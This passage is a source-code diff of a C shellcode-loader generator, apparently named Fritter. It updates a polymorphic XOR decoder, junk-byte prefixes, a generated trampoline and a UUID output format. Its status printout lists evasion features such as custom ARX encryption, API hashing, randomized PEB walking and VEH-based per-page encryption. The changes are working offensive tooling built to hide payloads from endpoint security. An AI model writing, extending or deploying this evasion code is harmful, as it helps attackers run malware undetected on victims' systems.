       // JNZ: target = loop_start, from = fixup_end[FIXUP_JNZ]
@@ -1481,8 +1664,10 @@ static int build_loader(PFRITTER_CONFIG c) {
       db[fixup_offset[FIXUP_JNZ]] = (uint8_t)jnz_disp;
     }
 
-    DPRINT("Polymorphic decoder: %d bytes (regs: kp=%d dp=%d cnt=%d idx=%d)",
-           decoder_stub_size, rKP.reg3, rDP.reg3, rCNT.reg3, rIDX.reg3);
+    DPRINT("Polymorphic decoder: %d bytes (regs: kp=%d dp=%d cnt=%d idx=%d) "
+           "key_len=%u zero_op=%02x order=%d",
+           decoder_stub_size, rKP.reg3, rDP.reg3, rCNT.reg3, rIDX.reg3,
+           key_len, zero_opcode, loop_order);
 
     // --- VEH shim integration ---
     // Page-pad the shim so the loader starts on a page boundary
@@ -1498,7 +1683,7 @@ static int build_loader(PFRITTER_CONFIG c) {
       return FRITTER_ERROR_NO_MEMORY;
     }
 
-    // Copy shim, pad with random bytes (not zeros — looks more natural)
+    // Copy shim, pad with random bytes (not zeros - looks more natural)
     memcpy(combined, VEH_SHIM_EXE_X64, shim_raw_size);
     if(shim_padded_size > shim_raw_size) {
       gen_random(combined + shim_raw_size, shim_padded_size - shim_raw_size);
@@ -1603,9 +1788,9 @@ static int build_loader(PFRITTER_CONFIG c) {
       DPRINT("Patched decoder counter: %d (shim only, loader is per-page encrypted)",
              shim_padded_size);
 
-      // XOR-encode the shim portion
+      // XOR-encode the shim portion (key_mask matches decoder's AND imm)
       for(uint32_t i = 0; i < shim_padded_size; i++) {
-        encoded[i] = combined[i] ^ xor_key[i & 7];
+        encoded[i] = combined[i] ^ xor_key[i & key_mask];
       }
       // Copy per-page encrypted loader as-is
       memcpy(encoded + shim_padded_size, combined + shim_padded_size, loader_size);
@@ -1616,14 +1801,15 @@ static int build_loader(PFRITTER_CONFIG c) {
              loader_size, combined_size, shim_padded_size, loader_size);
 
       for(uint32_t i = 0; i < combined_size; i++) {
-        encoded[i] = combined[i] ^ xor_key[i & 7];
+        encoded[i] = combined[i] ^ xor_key[i & key_mask];
       }
     }
     free(combined);
 
     // --- Calculate total PIC size ---
-    // Layout: [junk_prefix] [CALL 5B] [instance] [POP 1B] [junk_mid] [rsp_align]
-    //         [decoder_stub] [lea rdx 7B] [jmp rel32 5B] [page_pad] [encoded(shim+loader)]
+    // Layout: [pfx_buf fall-through] [CALL 5B] [instance] [POP 1B] [junk_mid]
+    //         [rsp_align] [decoder_stub] [lea rdx 7B] [jmp rel32 5B] [page_pad]
+    //         [encoded(shim+loader)]
     c->pic_len = pre_blob_size + page_pad + combined_size;
 
     c->pic = malloc(c->pic_len);
@@ -1636,13 +1822,9 @@ static int build_loader(PFRITTER_CONFIG c) {
 
     pl = (uint8_t*)c->pic;
 
-    // --- Feature 2A: Junk prefix ---
-    if(junk_prefix_len > 0) {
-      PUT_BYTE(pl, 0xEB);                          // jmp short
-      PUT_BYTE(pl, junk_prefix_len);               // skip N bytes
-      uint8_t junk_buf[15];
-      gen_random(junk_buf, junk_prefix_len);
-      PUT_BYTES(pl, junk_buf, junk_prefix_len);
+    // --- Feature 2A: Junk fall-through prefix ---
+    if(pfx_len > 0) {
+      PUT_BYTES(pl, pfx_buf, pfx_len);
     }
 
     // call $ + c->inst_len (call over instance data)
@@ -1660,21 +1842,9 @@ static int build_loader(PFRITTER_CONFIG c) {
     // --- Feature 2B: RSP alignment ---
     PUT_BYTES(pl, rsp_align, rsp_align_size);
 
-    // --- Decoder stub + trampoline + page padding + encoded(shim + loader) ---
+    // --- Decoder stub + generative trampoline + page padding + encoded(shim + loader) ---
     PUT_BYTES(pl, db, decoder_stub_size);
-
-    // lea rdx, [rip + (5 + page_pad)] — RDX = start of decoded VehShimEntry
-    // (skip past the jmp instruction and page padding)
-    {
-      uint8_t lea_rdx[7] = { 0x48, 0x8D, 0x15 };
-      int32_t lea_disp = 5 + (int32_t)page_pad;
-      memcpy(lea_rdx + 3, &lea_disp, 4);
-      PUT_BYTES(pl, lea_rdx, 7);
-    }
-
-    // jmp rel32 — skip page_pad bytes to reach decoded shim
-    PUT_BYTE(pl, 0xE9);
-    PUT_WORD(pl, page_pad);
+    PUT_BYTES(pl, tramp_buf, tramp_size);
 
     // Page alignment padding (random bytes, never executed)
     if(page_pad > 0) {
@@ -2369,6 +2539,9 @@ static int validate_format(opt_arg *arg, void *args) {
       } else
       if(!strcasecmp("hex", str)) {
         arg->u32 = FRITTER_FORMAT_HEX;
+      } else
+      if(!strcasecmp("uuid", str)) {
+        arg->u32 = FRITTER_FORMAT_UUID;
       }
     }
     // validate
@@ -2381,6 +2554,7 @@ static int validate_format(opt_arg *arg, void *args) {
       case FRITTER_FORMAT_POWERSHELL:
       case FRITTER_FORMAT_CSHARP:
       case FRITTER_FORMAT_HEX:
+      case FRITTER_FORMAT_UUID:
         break;
       default: {
         printf("WARNING: Invalid format specified: %"PRId32" -- setting to binary.\n", arg->u32);
@@ -2596,9 +2770,10 @@ int main(int argc, char *argv[]) {
     err = FritterCreate(&c);
 
     if(err != FRITTER_ERROR_OK) {
-      if(g_color) printf(C_RED C_BOLD "  ERROR" C_RST " %s\n", FritterError(err));
-      else printf("  ERROR: %s\n", FritterError(err));
-      return 0;
+      if(g_color) fprintf(stderr, C_RED C_BOLD "  ERROR" C_RST " %s\n", FritterError(err));
+      else fprintf(stderr, "  ERROR: %s\n", FritterError(err));
+      FritterDelete(&c);
+      return 1;
     }
     
     switch(c.mod_type) {
@@ -2627,9 +2802,6 @@ int main(int argc, char *argv[]) {
     
     // -- result display --
     {
-      const char *entropy_str =
-        c.entropy == FRITTER_ENTROPY_NONE   ? "None" :
-        c.entropy == FRITTER_ENTROPY_RANDOM ? "Random names" : "Random names + Encryption";
       const char *headers_str =
         c.headers == FRITTER_HEADERS_OVERWRITE ? "Overwrite" :
         c.headers == FRITTER_HEADERS_KEEP      ? "Keep all"  : "Undefined";
@@ -2668,12 +2840,12 @@ int main(int argc, char *argv[]) {
         printf("\n");
 
         printf(C_YEL "  PROTECTIONS" C_RST "\n");
-        printf("    Encryption  " C_WHT "ChaCha20" C_RST "\n");
+        printf("    Encryption  " C_WHT "Custom ARX (Chaskey-derived, CTR mode)" C_RST "\n");
         printf("    API Hashing " C_WHT "Maru" C_RST "\n");
         printf("    PE Headers  " C_WHT "%s" C_RST "\n", headers_str);
         printf("    Exec Guard  " C_WHT "%s" C_RST "\n", c.chunked ? "VEH sliding window + per-page encrypt" : "RW->RX");
         printf("    Decoder     " C_WHT "Polymorphic XOR" C_RST "\n");
-        printf("    PEB Access  " C_WHT "Direct gs:[0x60]" C_RST "\n");
+        printf("    PEB Access  " C_WHT "TEB-indirect (gs:0x30+0x60)" C_RST "\n");
         if(c.decoy[0]) printf("    Decoy       " C_WHT "%s" C_RST "\n", c.decoy);
         printf("    PEB Walk    " C_WHT "Randomized" C_RST "\n");
         printf("    Entry Stub  " C_WHT "Randomized" C_RST "\n");
@@ -2708,12 +2880,12 @@ int main(int argc, char *argv[]) {
         printf("\n");
 
         printf("  PROTECTIONS\n");
-        printf("    Encryption  ChaCha20\n");
+        printf("    Encryption  Custom ARX (Chaskey-derived, CTR mode)\n");
         printf("    API Hashing Maru\n");
         printf("    PE Headers  %s\n", headers_str);
         printf("    Exec Guard  %s\n", c.chunked ? "VEH sliding window + per-page encrypt" : "RW->RX");
         printf("    Decoder     Polymorphic XOR\n");
-        printf("    PEB Access  Direct gs:[0x60]\n");
+        printf("    PEB Access  TEB-indirect (gs:0x30+0x60)\n");
         if(c.decoy[0]) printf("    Decoy       %s\n", c.decoy);
         printf("    PEB Walk    Randomized\n");
         printf("    Entry Stub  Randomized\n");
